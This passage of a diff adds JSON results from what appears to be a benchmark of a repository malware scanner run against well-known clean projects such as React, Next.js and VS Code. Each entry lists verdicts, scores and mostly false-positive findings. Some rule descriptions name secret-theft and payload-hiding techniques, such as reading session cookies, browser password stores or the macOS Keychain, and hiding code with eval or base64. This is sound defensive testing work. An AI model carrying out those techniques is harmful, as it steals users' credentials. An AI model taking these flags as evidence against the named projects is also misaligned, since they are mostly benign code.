+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "unspecified",
+          "type": "TYPOSQUAT_PACKAGE",
+          "rule": "TYPOSQUAT_PACKAGE",
+          "file": "package.json",
+          "line": null,
+          "description": "Possible typosquat of \"mocha\": matcha"
+        }
+      ],
+      "filesScanned": 21,
+      "filesSkipped": 13,
+      "treeTruncated": false,
+      "durationMs": 3006,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-uuid",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/uuidjs/uuid",
+      "immutableRef": "ea83515d6a4de13a8f9d253fe772752c9dd7bbbe",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.09,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "SUSPICIOUS_FILE_ACCESS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "scripts/build.sh",
+          "line": 23,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        }
+      ],
+      "filesScanned": 100,
+      "filesSkipped": 34,
+      "treeTruncated": false,
+      "durationMs": 4427,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-node-fetch",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/node-fetch/node-fetch",
+      "immutableRef": "8b3320d2a7c07bce4afc6b2bf6c3bbddda85b01f",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 27,
+      "filesSkipped": 26,
+      "treeTruncated": false,
+      "durationMs": 2169,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-react",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/facebook/react",
+      "immutableRef": "c0c39a6b3907eaab35f43074949e2957a2a734c1",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.0375,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "NETWORK_COMMUNICATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "compiler/apps/playground/components/Icons/IconGitHub.tsx",
+          "line": 20,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (2 occurrences)"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 7070,
+      "treeTruncated": false,
+      "durationMs": 6000,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-vue",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vuejs/core",
+      "immutableRef": "9e03beb6b4c85a9d5b49b731c08263aa648e2a2a",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.0375,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_NEW_FUNCTION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "packages/compiler-core/src/options.ts",
+          "line": 312,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "packages/compiler-core/src/validateExpression.ts",
+          "line": null,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "packages/compiler-dom/src/transforms/stringifyStatic.ts",
+          "line": 405,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 503,
+      "treeTruncated": false,
+      "durationMs": 3829,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-svelte",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/sveltejs/svelte",
+      "immutableRef": "b4d1583ae20f3869a88a731d9a265c546c099f66",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 8765,
+      "treeTruncated": false,
+      "durationMs": 3898,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-vite",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vitejs/vite",
+      "immutableRef": "fef682d3f067d534a559faf6fd9baedda2e9f8f1",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 2513,
+      "treeTruncated": false,
+      "durationMs": 3743,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-next",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vercel/next.js",
+      "immutableRef": "93249ee06d6e0c105b1278412768c8e0816d9936",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.27,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "OBF_EVAL",
+        "OBFUSCATED_CODE",
+        "EXFIL_COOKIE",
+        "SUSPICIOUS_FILE_ACCESS",
+        "CODE_INTEGRITY_ISSUE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": ".github/actions/needs-triage/dist/index.js",
+          "line": 1,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": ".github/actions/needs-triage/dist/index.js",
+          "line": 9,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/needs-triage/dist/index.js",
+          "line": 1,
+          "description": "Extremely long line detected (340,182 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (127,929 chars, contains suspicious code), Line 7 (135,823 chars, contains suspicious code), Line 8 (284,175 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "EXFIL_COOKIE",
+          "file": ".github/actions/next-repo-actions/dist/feature-requests/index.mjs",
+          "line": 19,
+          "description": "Reads browser cookies via document.cookie — can steal session tokens"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": ".github/actions/next-repo-actions/dist/feature-requests/index.mjs",
+          "line": 1,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": ".github/actions/next-repo-actions/dist/feature-requests/index.mjs",
+          "line": 1,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/next-repo-actions/dist/feature-requests/index.mjs",
+          "line": 1,
+          "description": "Extremely long line detected (283,655 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (266,231 chars, contains suspicious code), Line 15 (120,797 chars, contains suspicious code), Line 16 (283,655 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "EXFIL_COOKIE",
+          "file": ".github/actions/next-repo-actions/dist/issues/index.mjs",
+          "line": 19,
+          "description": "Reads browser cookies via document.cookie — can steal session tokens"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": ".github/actions/next-repo-actions/dist/issues/index.mjs",
+          "line": 1,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": ".github/actions/next-repo-actions/dist/issues/index.mjs",
+          "line": 1,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/next-repo-actions/dist/issues/index.mjs",
+          "line": 1,
+          "description": "Extremely long line detected (283,655 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (266,231 chars, contains suspicious code), Line 15 (120,797 chars, contains suspicious code), Line 16 (283,655 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": ".github/actions/next-repo-actions/dist/wrong-issue-template/index.js",
+          "line": 1,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/next-repo-actions/dist/wrong-issue-template/index.js",
+          "line": 1,
+          "description": "Extremely long line detected (284,026 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (283,862 chars, contains suspicious code), Line 2 (283,305 chars, contains suspicious code), Line 3 (116,956 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": ".github/actions/pr-auto-label/dist/index.js",
+          "line": 1,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/pr-auto-label/dist/index.js",
+          "line": 1,
+          "description": "Extremely long line detected (284,182 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (277,617 chars, contains suspicious code), Line 2 (284,182 chars, contains suspicious code), Line 3 (70,968 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": ".github/actions/upload-turboyet-data/dist/index.js",
+          "line": 8,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/upload-turboyet-data/dist/index.js",
+          "line": 8,
+          "description": "Extremely long line detected (55,653 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 8 (55,653 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": ".github/actions/upload-turboyet-data/dist/sourcemap-register.js",
+          "line": 1,
+          "description": "Extremely long line detected (41,053 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 1 (41,053 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": ".github/actions/next-repo-actions/dist/feature-requests/index.mjs",
+          "line": 19,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": ".github/actions/next-repo-actions/dist/issues/index.mjs",
+          "line": 19,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "CODE_INTEGRITY_ISSUE",
+          "rule": "CODE_INTEGRITY_ISSUE",
+          "file": ".github/actions/next-repo-actions/dist/feature-requests/index.mjs",
+          "line": null,
+          "description": "Minified/obfuscated code detected in source repository"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "CODE_INTEGRITY_ISSUE",
+          "rule": "CODE_INTEGRITY_ISSUE",
+          "file": ".github/actions/next-repo-actions/dist/issues/index.mjs",
+          "line": null,
+          "description": "Minified/obfuscated code detected in source repository"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 29628,
+      "treeTruncated": false,
+      "durationMs": 10970,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-nest",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/nestjs/nest",
+      "immutableRef": "f2938487c45db149964a8b0efc58a073610dcdf1",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 1928,
+      "treeTruncated": false,
+      "durationMs": 3382,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-vscode",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/microsoft/vscode",
+      "immutableRef": "af2c64423e7ee5d1030a000c82a0bb774d043351",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.2625,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "CREDENTIAL_THEFT",
+        "NETWORK_COMMUNICATION",
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "Manual review required; this result is not yet classified as a false positive.",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "build/buildfile.ts",
+          "line": 16,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "high",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "CREDENTIAL_THEFT",
+          "file": "build/darwin/sign.ts",
+          "line": 145,
+          "description": "Reads browser password databases (Chrome Login Data, Firefox logins.json) or dumps the macOS Keychain via the security(1) command"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "build/filters.ts",
+          "line": 72,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "build/gulpfile.reh.ts",
+          "line": 74,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "build/gulpfile.vscode.ts",
+          "line": 86,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "build/gulpfile.vscode.web.ts",
+          "line": 70,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "build/azure-pipelines/common/publish.ts",
+          "line": 598,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (2 occurrences)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "build/builtin/browser-main.js",
+          "line": 42,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 16247,
+      "treeTruncated": false,
+      "durationMs": 7152,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-playwright",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/microsoft/playwright",
+      "immutableRef": "2670e5cae0239502d053e530da2c675e5aa536aa",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.11249999999999999,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "OBFUSCATED_CODE",
+        "OBF_EVAL",
+        "DATA_EXFILTRATION",
+        "NETWORK_COMMUNICATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "browser_patches/firefox/juggler/TargetRegistry.js",
+          "line": 267,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "packages/html-reporter/src/images.ts",
+          "line": 17,
+          "description": "Extremely long line detected (90,767 characters). Malicious code may be hidden far to the right. Affected: Line 17 (90,767 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/injected/src/clock.ts",
+          "line": 369,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/injected/src/injectedScript.ts",
+          "line": 247,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "packages/injected/src/recorder/clipPaths.ts",
+          "line": 30,
+          "description": "Extremely long line detected (7,049 characters). Malicious code may be hidden far to the right. Affected: Line 30 (7,049 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/injected/src/utilityScript.ts",
+          "line": 73,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "packages/injected/src/bidiInsertText.ts",
+          "line": 34,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "packages/injected/src/injectedScript.ts",
+          "line": 869,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "packages/injected/src/recorder/clipPaths.ts",
+          "line": 30,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 3047,
+      "treeTruncated": false,
+      "durationMs": 4826,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-cypress",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/cypress-io/cypress",
+      "immutableRef": "cd8bb88f1080d0ee354e605fadba986b03320828",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.15,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "TYPOSQUAT_PACKAGE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "unspecified",
+          "type": "TYPOSQUAT_PACKAGE",
+          "rule": "TYPOSQUAT_PACKAGE",
+          "file": "cli/package.json",
+          "line": null,
+          "description": "Possible typosquat of \"eslint\": dtslint"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 6980,
+      "treeTruncated": false,
+      "durationMs": 4879,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-electron",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/electron/electron",
+      "immutableRef": "8215b5aa536ec6ae121003bc618bdd825bdbbb0f",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.0375,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "docs/fiddles/features/navigation-history/renderer.js",
+          "line": 20,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "docs/fiddles/ipc/pattern-1/renderer.js",
+          "line": 4,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "docs/fiddles/system/clipboard/copy/renderer.js",
+          "line": 5,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 2849,
+      "treeTruncated": false,
+      "durationMs": 3713,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-esbuild",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/evanw/esbuild",
+      "immutableRef": "6ff1d8b0d8c134e867a397eef39702a223ebef9e",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.1275,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "SUSPICIOUS_FILE_ACCESS",
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "lib/npm/node-install.ts",
+          "line": 169,
+          "description": "Suspicious file access detected: System Directory Write"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "pkg/api/api_impl.go",
+          "line": 2288,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 149,
+      "treeTruncated": false,
+      "durationMs": 6114,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-node",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/nodejs/node",
+      "immutableRef": "1314579f8c82ed70b8cbe736fdea1df48624c285",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 49533,
+      "treeTruncated": false,
+      "durationMs": 5951,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-hapijs-hapi",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/hapijs/hapi",
+      "immutableRef": "d4f93d80e6acadb0000f1cf67f9b1b5992e8a8cc",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
